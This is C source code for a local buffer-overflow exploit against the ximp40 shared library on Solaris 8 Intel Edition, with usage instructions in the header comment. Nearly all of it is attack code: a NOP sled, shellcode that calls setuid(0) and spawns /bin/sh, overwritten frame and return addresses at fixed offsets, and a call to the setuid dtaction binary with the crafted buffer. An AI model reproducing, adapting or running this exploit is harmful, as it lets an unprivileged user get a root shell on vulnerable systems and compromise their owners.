/*====================================================================
   Solaris ximp40 shared library exploit for Solaris8 Intel Edition
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
   [usage]
    #xhost +targethost
    #telnet targethost
    ...
    %setenv DISPLAY yourhost:0.0
    %gcc ximp40.c
    %./a.out
    0:Default value 1:Calculated value > 1   <- Input 0 or 1
  ====================================================================
*/

#include  <stdio.h>

#define     BUF_SIZE        272
#define     EIP_OFFSET      260
#define     FAKE_OFFSET     264
#define     FAKE_VALUE      0x08046dec
#define     EIP_VALUE       0x08047cb4
#define     FAKE_VALUE_DIF  0xd9c
#define     EIP_VALUE_DIF   0x12c
#define     NOP             0x90

char    shell_code[]=
  "\xeb\x3b\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xc1"
  "\x88\x46\xc6\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x17\xe8\xdf"
  "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89"
  "\x5e\x08\x53\xb0\x3b\xe8\xc8\xff\xff\xff\x83\xc4\x0c\xe8\xc8\xff"
  "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff"
  "\xff\xff";

unsigned long get_sp(void)
{
  __asm__(" movl %esp,%eax ");
}

void valset(char *p,unsigned int val)
{
    *p=val&0xff;
    *(p+1)=(val>>8)&0xff;
    *(p+2)=(val>>16)&0xff;
    *(p+3)=(val>>24)&0xff;
}

main()
{
    char            buf[BUF_SIZE];
    unsigned int    esp=get_sp(),sw;

    memset(buf,NOP,BUF_SIZE);
    memcpy(buf+EIP_OFFSET-strlen(shell_code),shell_code,
           strlen(shell_code));

    printf("esp=%x\n",esp);
    printf("0:Default value 1:Calculated value >");
    fflush(stdout);
    scanf("%d",&sw);
    if (sw==0){
        valset(buf+FAKE_OFFSET, FAKE_VALUE);
        valset(buf+EIP_OFFSET , EIP_VALUE);
        printf("Jumping address = %x\n",EIP_VALUE);
    }else{
        valset(buf+FAKE_OFFSET, esp-FAKE_VALUE_DIF);
        valset(buf+EIP_OFFSET , esp+EIP_VALUE_DIF);
        printf("Jumping address = %x\n",esp+EIP_VALUE_DIF);
    }
    buf[BUF_SIZE-1]=0;

    execl("/usr/dt/bin/dtaction",buf,NULL);
}
